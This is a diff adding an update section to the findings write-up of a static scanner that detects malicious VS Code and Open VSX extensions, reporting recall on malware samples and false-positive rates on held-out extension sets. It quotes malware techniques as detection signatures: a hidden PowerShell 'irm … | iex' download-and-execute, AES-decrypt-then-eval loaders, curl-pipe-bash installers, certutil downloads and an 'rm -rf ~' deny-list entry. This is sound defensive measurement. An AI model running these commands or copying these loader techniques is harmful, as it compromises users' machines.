@@ -6,6 +6,155 @@ engine. Like [mcp-audit](https://github.com/eltociear/mcp-audit/blob/main/FINDIN
 [npm-audit](https://github.com/eltociear/npm-audit/blob/main/FINDINGS.md), it is calibrated so that
 "clean" means clean before any number is reported.
 
+## Update 2026-11-27 (v0.2.0): recall measured, a third held-out set
+
+The first version was calibrated for precision only: its recall had been checked on canaries we
+wrote ourselves. This update measures recall on real and independently written malicious
+extensions first, fixes what it missed, and then re-measures precision on a fresh set the engine
+had never seen. Everything below the next rule is the original v0.1.0 write-up, unchanged.
+
+### Recall: what v0.1.0 missed
+
+Three malware sets, scanned statically (nothing installed or executed; samples were never
+committed and were deleted after the run; [benchmarks/recall_manifest.json](benchmarks/recall_manifest.json)
+lists names, versions and SHA-256):
+
+| Set | What it is | v0.1.0 HIGH+ | v0.2.0 HIGH+ |
+| --- | --- | --- | --- |
+| **Real samples** | 4 removed malicious extensions still archived by researchers: two GlassWorm-linked themes (Socket), a fake Solidity extension (ShowSnowcrypto), a tunnel-exfil "secure code" extension | **1 / 4** | 4 / 4 (tuned on) |
+| **Reconstructions** | 20 inert canaries rebuilt from published write-ups (Koi, Socket, Kaspersky, ReversingLabs, Secure Annex, Checkmarx, Check Point, ExtensionTotal); hosts are `.invalid` / TEST-NET | **7 / 20** | 19 / 20 (tuned on) |
+| **Third-party canaries** (held out) | 17 malicious samples written by two other projects (`rodhayl/VSCodeAntivir`, `junbjnnn/glassworm-poc`), frozen-engine run | 3 / 17 | **4 / 17** |
+| **Marketplace-removed, still on Open VSX** (held out, weak labels) | 18 IDs that Microsoft lists as removed for *Malware* and that still resolve on open-vsx.org | n/a | 0 / 18 |
+
+The last row does not measure recall: a static read of all 18 Open VSX builds found no payload in
+any of them (one is built from the same template as the GlassWorm-linked themes above, minus the
+encrypted stage: a sleeper). Microsoft's removal applied to Marketplace builds we cannot
+download. It is listed so that nobody reads "0/18" as either a miss or a clean bill.
+
+The v0.1.0 misses on real malware were not exotic:
+
+- **AES-decrypt-then-eval.** Both GlassWorm-linked themes ship `crypto.createDecipheriv('aes-256-cbc', '<hard-coded key>', …)` over an 8 KB hex blob and `eval` the plaintext. No base64, no `_0x`, no network in the first stage: v0.1.0 saw nothing. → `decrypt_eval`.
+- **`irm https://… | iex`.** The fake Solidity extension runs `powershell -WindowStyle Hidden -Command "irm https://…/aaa | iex"`. v0.1.0 only knew the `iex (irm …)` order. → new `download_execute` signature, plus `iwr -OutFile …; Start-Process`, `WebClient.DownloadFile … Start-Process` and `certutil -urlcache`.
+- **Obfuscator string tables.** That same command sat in a `javascript-obfuscator` string array with every space written as `\x20`, and the array element looked like a deny-list entry, so the list demotion ate it. → escaped strings are decoded into a second view when that reveals a shell/eval keyword, and list demotion is off inside `_0x` output.
+- **Zip layout.** One archived sample is a plain zip of the unpacked folder, not a `.vsix` with `extension/`. → read from the folder that holds `package.json`.
+
+The reconstructions added the shapes write-ups describe but no archived sample showed:
+remote JS fetched from a hard-coded host and `eval`'d on a timer (TigerJack) → `remote_eval`;
+a `.cmd`/`.vbs`/`.exe` written to `%TEMP%` from a download and launched (WhiteCobra, Aurora Nocturne,
+prettier-vscode-plus) → `temp_dropper`; a second-stage `.vsix` downloaded and installed with
+`--install-extension` into every editor (GlassWorm 2026) → `vsix_sideload`; a hard-coded GitHub token
+polling issues and spawning their bodies (susvsex) → `github_c2`; zero-width-character payloads
+(Aurora Nocturne) → `invisible_unicode` now covers U+200B-U+200D/U+2060-U+2064/U+FEFF runs.
+
+**Still missed, on purpose or not:**
+
+- **Source-code theft by a fake AI assistant** (ChatMoss / "ChatGPT 中文版"; the third-party
+  `fake-ai-assistant` sample): `document.getText()` posted to a server on every edit is exactly what
+  Copilot-style extensions do. A static scan cannot tell the two apart; it stays a known gap.
+- **13 of the 17 third-party samples**: 11 of them are defanged demos whose sink is commented out or
+  replaced by `console.log` (credential read with no send, a C2 beacon that only logs, a Solana RPC
+  call with no memo/eval, a marker variable). They carry no executable payload, and the engine is
+  built not to score capabilities alone, so this number will stay low by design. The other two
+  (OtterCookie-style socket.io C2 with fingerprinting, the fake AI assistant) are real gaps.
+- **Native droppers** (GlassWorm's Zig binary) and **transitive loaders** via `extensionPack` /
+  `extensionDependencies`: the binary is listed as INFO, the pack is listed as INFO; neither is
+  scored.
+- The real-sample and reconstruction rows are **tuning sets**: the rules were written against them,
+  so 4/4 and 19/20 say the rules fire, not that they generalise. The held-out rows are the honest
+  ones, and they are weak.
+
+### Precision: the old held-out flags, classified
+
+The v0.1.0 held-out sets flagged 17 extensions (9 of 300, 8 of 295). Two were kept on purpose (a
+VM-obfuscated bundle, a plain-`http` `curl | bash`). The 15 false positives fall into seven classes:
+
+| Class | Count | v0.1.0 fix | v0.2.0 |
+| --- | --- | --- | --- |
+| Another vendor's CLI install script (`x.ai`, `cursor.com`, `pi.dev`, `antigravity.google`, `dev.meta.ai`) | 4 | added each domain to a list | **shape rule**: an HTTPS `…/install.sh` / `…-installer.ps1` from a named host is MEDIUM, whatever the host; plain http, raw IPs, paste/gist/tunnel hosts and payload-shaped paths stay CRITICAL |
+| Install command shown to the user (HTML, log/error message) | 2 | display/log context | unchanged |
+| Deny-list of dangerous commands (`rm -rf ~`) in an agent-safety table | 2 | deny-rule context | unchanged (but not inside obfuscator output) |
+| Publisher's own `ovsx publish -p $PAT` (shipped `.sh`, bundled `package.json` scripts) | 3 | release-script context | unchanged |
+| SDK reading its **own** Keychain item (bundled Claude Agent SDK) | 2 | Keychain = INFO unless a browser "Safe Storage" key | unchanged |
+| Telegram integration using the user's bot token | 1 | hard-coded token required | unchanged |
+| Security vendor's own GitHub org installer | 1 | vendor-host MEDIUM | unchanged |
+
+The domain list was the weak point: every held-out set surfaced new coding-agent vendors, so
+v0.2.0 replaces "is this a known vendor" with "is this shaped like a published installer".
+
+New rules were checked against the original calibration corpus (the same 950 extension IDs,
+re-downloaded 2026-11-27 at their current versions; 937 scanned, 13 over 150 MB skipped). Three
+new benign shapes surfaced and became controls in `tests/fixtures/`: the `sudo-prompt` elevation
+helper (`elevate.vbs` in temp), a static PowerShell helper written to temp, and the monaco/AMD
+module loader (`fetch` + `new Function` with `//# sourceURL`).
+
+| Engine | Calibration corpus (937) HIGH+ | MEDIUM |
+| --- | --- | --- |
+| v0.1.0 | 3 (0.3%) | 22 |
+| v0.2.0 | 3 (0.3%), the same three | 24 |
+
+### Held-out set 3 (fresh, never seen)
+
+900 extensions that were in none of the earlier sets, scanned once with the engine frozen in
+commit `5ed9763` (v0.2.0) before the run: **500 from Open VSX** (download ranks 946-1449, 25K-48K
+downloads) and, for the first time, **400 from the VS Code Marketplace** (top installs via the
+public gallery API, 0.5M-214M installs, excluding anything already scanned). 893 scanned
+(6 over 150 MB, 1 failed download); 4.3 GB of text, 304K files. The index is
+[benchmarks/heldout3_index.json](benchmarks/heldout3_index.json), per-extension results
+[benchmarks/heldout3_results.json](benchmarks/heldout3_results.json) (flagged rows anonymised).
+
+| Set | Scanned | HIGH/CRITICAL | of which false positives | MEDIUM |
+| --- | --- | --- | --- | --- |
+| Open VSX ranks 946-1449 | 498 | 9 (1.8%) | 6 (1.2%) | 8 |
+| VS Code Marketplace top | 395 | 1 (0.3%) | 1 (0.3%) | 2 |
+| **All held-out 3** | **893** | **10 (1.1%)** | **7 (0.8%)** | 10 |
+
+So the target (at most 1% HIGH+ false positives on a fresh set) is met for false positives
+(**0.8%**), but not for "flagged at all" (**1.1%**), and only on the Marketplace half by a wide
+margin. The Open VSX long tail is noisier: smaller publishers ship their release tooling.
+
+What the 10 were:
+
+- **3 true findings (one publisher, three extensions):** each POSTs data to a hard-coded
+  `webhook.site` URL, a public request bin that anyone holding the URL can read: JUnit results with
+  stack traces and test context, session details, commit notifications. It looks like debugging code
+  left in, not an attack, but the user's data does leave to a third-party collector. HIGH is the
+  right call. (Not named, per the policy below.)
+- **5 publisher release scripts** (`ovsx publish -p $TOKEN`, Open VSX publish-by-token, `npm publish`
+  with an auth token) in `publish.js` / `scripts/publish-*.js` / `bin/publish-*.cjs` or a bundled
+  `scripts` object with unquoted keys. v0.1.0 already demoted this shape in `.sh` files and quoted
+  `package.json` entries; the JS variants were new.
+- **1 third-party installer shown as a manual fallback** (`curl -fsSL https://raw.githubusercontent.com/<tool>/…/install.sh | bash  # manual`).
+  One of the release-script extensions also carries a whole `installCommand: { linux: "curl … install.sh | sh" }`
+  table for half a dozen security tools. Installers on `raw.githubusercontent.com` were deliberately
+  kept CRITICAL in v0.2.0.
+- **1 tunnel client:** a preview-server extension bundling `localtunnel`, whose default host and
+  test regexes contain `localtunnel.me`.
+
+Fixed **after** the run (v0.2.1; not an independent number): JS release scripts (a file named
+`*publish*/*release*/*deploy*`, under `scripts/` `bin/` `tools/`, or run by a `package.json` script,
+and `publish` matched only within one shell command), a tool's own `install*.sh` in its GitHub repo
+and installer domains (`https://atlasgo.sh | sh`) to MEDIUM, and a tunnel service's bare domain or a
+tunnel host inside a regex to INFO. With v0.2.1 the same 893 give 3 HIGH+ (the three webhook.site
+leaks) and 0 known false positives, which is exactly what an overfit fix would show, so the number
+to quote is the frozen one: **0.8% false positives, 1.1% flagged.** The calibration corpus is unchanged
+by v0.2.1 (these rules only lower severities; its three HIGH+ stay HIGH+), and recall on all splits
+is unchanged (4/4, 19/20, 4/17).
+
+### Still weak
+
+- **Recall on independently written malware is low (4/17)**, mostly because those samples are
+  defanged; the two real gaps (fake-AI source exfil, socket.io C2) are behavioural and need data-flow,
+  not patterns.
+- **Real samples are scarce.** Registries delete malicious versions (all 23 GlassWorm-linked Open VSX
+  IDs/versions we tried return 404, and the registry's blob storage serves nothing for them either), so
+  4 real archives is what is publicly downloadable today. Most recall evidence is reconstruction.
+- **Long-tail Open VSX is noisier than the top.** Expect about 1 in 55 extensions from ranks
+  ~1000-1500 to need a look, against 1 in 400 on the Marketplace top.
+
+---
+
+*The original v0.1.0 write-up follows, unchanged.*
+
 ## Method
 
 1. Listed the most-downloaded extensions on open-vsx.org (2026-11-24/25), latest version of each:
